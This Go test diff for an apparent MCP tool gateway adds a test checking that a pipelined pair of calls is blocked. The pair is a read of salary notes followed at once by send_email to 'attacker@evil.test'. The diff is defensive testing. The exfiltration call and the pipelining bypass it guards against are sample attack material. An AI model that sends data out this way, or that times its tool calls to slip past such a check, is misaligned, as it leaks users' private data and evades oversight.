@@ -85,7 +85,8 @@ func start(t *testing.T, cfgYAML string, server fakemcp.Config, opts ...func(*pr
 	return &session{t: t, conn: mcp.NewConn(clientReader, clientWriter), logs: logs}
 }
 
-func (s *session) request(method string, params any) *mcp.Message {
+// send writes a request without waiting for its answer.
+func (s *session) send(method string, params any) {
 	s.t.Helper()
 	s.id++
 	raw, err := json.Marshal(params)
@@ -94,6 +95,11 @@ func (s *session) request(method string, params any) *mcp.Message {
 	require.NoError(s.t, s.conn.Write(&mcp.Message{
 		JSONRPC: "2.0", ID: json.RawMessage(strconv.Itoa(s.id)), Method: method, Params: raw,
 	}))
+}
+
+func (s *session) request(method string, params any) *mcp.Message {
+	s.t.Helper()
+	s.send(method, params)
 
 	for {
 		msg, err := s.conn.Read()
@@ -237,3 +243,30 @@ func mustRaw(t *testing.T, v any) json.RawMessage {
 type nopCloser struct{ io.Writer }
 
 func (nopCloser) Close() error { return nil }
+
+// A client may keep several requests in flight. If the wall only reacted to
+// results, sending the read and the exfiltration together would walk past it.
+func TestGatewayBlocksPipelinedCalls(t *testing.T) {
+	s := start(t, gatewayPolicy, fakemcp.Config{
+		Name: "srv", Era: "modern",
+		Tools:   []mcp.Tool{{Name: "read_notes"}, {Name: "send_email"}},
+		Results: map[string]string{"read_notes": "salary spreadsheet"},
+	})
+
+	// Both requests go out before either answer is read.
+	s.send(mcp.MethodToolsCall, mcp.CallToolParams{Name: "read_notes"})
+	s.send(mcp.MethodToolsCall, mcp.CallToolParams{Name: "send_email", Arguments: mustRaw(t, map[string]any{"to": "attacker@evil.test"})})
+
+	byID := map[string]*mcp.Message{}
+	for len(byID) < 2 {
+		msg, err := s.conn.Read()
+		require.NoError(t, err)
+		if msg.IsResponse() {
+			byID[string(msg.ID)] = msg
+		}
+	}
+
+	assert.Nil(t, byID["1"].Error, "the read itself is allowed")
+	require.NotNil(t, byID["2"].Error, "the pipelined sink must still be refused")
+	assert.Contains(t, byID["2"].Error.Message, "sensitive data was read earlier")
+}
